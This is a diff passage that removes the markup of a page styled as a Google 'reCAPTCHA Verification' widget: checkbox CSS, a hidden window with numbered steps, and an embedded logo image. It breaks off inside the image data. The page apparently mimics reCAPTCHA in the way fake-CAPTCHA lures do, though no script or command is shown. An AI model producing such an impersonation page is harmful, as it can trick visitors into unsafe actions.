@@ -1,430 +1,524 @@
 <!DOCTYPE html>
-
 <html lang="en">
-    <head>
-        <meta charset="utf-8">
-        <title>reCAPTCHA Verification</title>
-
-        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">
-        <style>
-        .container {
-            font-family: Roboto, helvetica, arial, sans-serif;
-        }
-
-        .m-p {
-            margin: 0;
-            padding: 0;
-        }
-
-        .block {
-            display: block;
-        }
-
-        code {
-            font-size: 9px;
-            margin-left: 2px;
-            color: gray;
-        }
-
-        .line-normal {
-            line-height: normal;
-        }
-
-        .checkbox-window {
-            height: 74px;
-            width: 300px;
-            background-color: #f9f9f9;
-            border-radius: 3px;
-            border: 1px solid #d3d3d3;
-        }
-
-        .checkbox-window a {
-            color: #555;
-            text-decoration: none;
-        }
-
-        .checkbox-window a:hover {
-            color: #555;
-            text-decoration: underline;
-        }
-
-        .checkbox-container {
-            width: 28px;
-            height: 28px;
-        }
-
-        .checkbox {
-            position: relative;
-            background-color: #fff;
-            border-radius: 2px;
-            height: 100%;
-            width: 100%;
-            border: 2px solid #c1c1c1;
-            margin: 21px 0 0 12px;
-            outline: none;
-            font-family: Roboto, helvetica, arial, sans-serif;
-            transition: width 500ms, height 500ms, border-radius 500ms, margin-top 500ms, margin-left 500ms, opacity 700ms;
-        }
-
-        .checkbox:hover {
-            border: 2px solid #b2b2b2;
-        }
-
-        .im-not-a-robot {
-            position: relative;
-            left: 52px;
-            bottom: 3px;
-            font-size: 15px;
-            color: #282727;
-        }
-
-        .captcha-logo {
-            position: relative;
-
-            left: 244px;
-            bottom: 36px;
-            width: 40px;
-            height: 45px;
-            vertical-align: baseline;
-            padding-bottom: 4px;
-        }
-
-
-        .checkbox-desc {
-            color: #555555;
-            position: relative;
-            font-size: 8px;
-            text-align: center;
-            bottom: 40px;
-            left: 112px;
-        }
-
-        .spinner {
-            visibility: hidden;
-            position: relative;
-            top: -85px;
-            left: 12px;
-            height: 20px;
-            width: 20px;
-            border: 2px solid rgba(0, 0, 0, 0.1);
-            border-top: 2px solid #333;
-            border-radius: 50%;
-            visibility: hidden;
-            opacity: 0;
-            transition: opacity 0.5s linear;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .verify-window {
-            font-family: Roboto, helvetica, arial, sans-serif;
-            opacity: 0;
-            position: absolute;
-            visibility: hidden;
-            margin: auto;
-            width: 310px;
-            background-color: #fff;
-            border: 1px solid #cecece;
-            -webkit-box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
-            box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
-            transition: opacity 400ms;
-        }
-
-        ol {
-            counter-reset: item;
-            list-style-type: none;
-            list-style-position: outside;
-            padding-left: 0;
-
-        }
-
-        ol li {
-            counter-increment: item;
-            margin-bottom: 10px;
-
-        }
-
-        ol li::before {
-            content: counter(item) ". ";
-            color: #1A73E8;
-            font-weight: bold;
-            margin-right: 10px;
-            margin-left: 10px;
-        }
-
-        .verify-container {
-            padding: 8px;
-        }
-
-        .verify-header {
-            background-color: #1A73E8;
-            padding: 16px 16px 24px 16px;
-            color: #fff;
-        }
-
-        .verify-header-text-small {
-            font-size: 14px;
-            line-height: normal;
-        }
-
-        .verify-header-text-medium {
-            font-size: 16px;
-        }
-
-        .verify-header-text-big {
-            font-size: 24px;
-            font-weight: 700;
-        }
-
-        .verify-main {
-            padding: 5px;
-            color: #111;
-            font-size: 13px;
-
-        }
-
-        .verify-footer {
-            border-top: 1px solid #cecece;
-            padding: 10px 7px 10px 7px;
-            color: #737373;
-            display: grid;
-            grid-template-columns: auto 102px;
-            font-size: 13px;
-        }
-
-        .verify-footer-left {
-            padding: 5px;
-        }
-
-        .verify-verify-button {
-            text-transform: uppercase;
-            background-color: #5a89e2;
-            color: #fff;
-            text-align: center;
-            width: 100%;
-            padding: 12px 0 12px 0;
-            text-decoration: none;
-            font-weight: 600;
-            height: min-content;
-            border-radius: 3px;
-            font-size: 14px;
-            border: none;
-            outline: none;
-            cursor: not-allowed;
-        }
-        </style>
-    </head>
-    <body>
-
-    <div class="container m-p">
-        <div id="checkbox-window" class="checkbox-window m-p block">
-            <div class="checkbox-container m-p">
-                <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
-            </div>
-            <p class="im-not-a-robot m-p line-normal">I'm not a robot</p>
-            <img src="data:image/png;base64,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